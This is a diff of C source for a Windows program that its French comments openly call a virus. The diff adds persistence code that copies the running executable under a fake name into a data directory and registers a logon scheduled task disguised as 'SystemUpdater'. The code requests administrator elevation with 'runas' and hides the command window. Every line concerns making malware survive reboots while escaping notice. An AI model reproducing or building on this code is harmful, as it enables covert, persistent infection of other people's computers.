@@ -1,8 +1,9 @@
 #include <stdio.h>
 #include <shellapi.h>
 #include <windows.h>
+#include <string.h>
 
-void set_persistance(char * softwareDataDirectory, char * executable_name){
+void set_persistance(char *softwareDataDirectory, char *current_executable_path, char *fake_executable_name){
 
     /*Pour la parsistance du virus il y aa plusieurs manières de faire:
         - copier dans le dossier de démarage:  C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
@@ -17,8 +18,15 @@ void set_persistance(char * softwareDataDirectory, char * executable_name){
 
     SHELLEXECUTEINFO sei;
     ZeroMemory(&sei, sizeof(sei));
-    sei.cbSize = sizeof(sei);  
+    sei.cbSize = sizeof(sei);
+    sei.lpVerb = "runas";   
     sei.lpFile = "cmd.exe"; 
     char cmd[1024];
-    fnprintf(cmd, "schtasks /create /tn WinSys /tr \"%d%d\" /sc onlogon", softwareDataDirectory, executable_name);
+    snprintf(cmd, 1024, "/c copy \"%s\" \"%s\\%s\" & schtasks /create /tn SystemUpdater /tr \"%s\\%s\" /sc onlogon", current_executable_path, softwareDataDirectory, fake_executable_name, softwareDataDirectory, fake_executable_name);
+    printf("Commande pour la persistance: %s\n", cmd);
+    sei.lpParameters = cmd;
+    sei.nShow = SW_HIDE; // pour masquer laz fenètre du cmd
+    if (ShellExecuteEx(&sei)) {
+        WaitForSingleObject(sei.hProcess, INFINITE);
+    }
 };
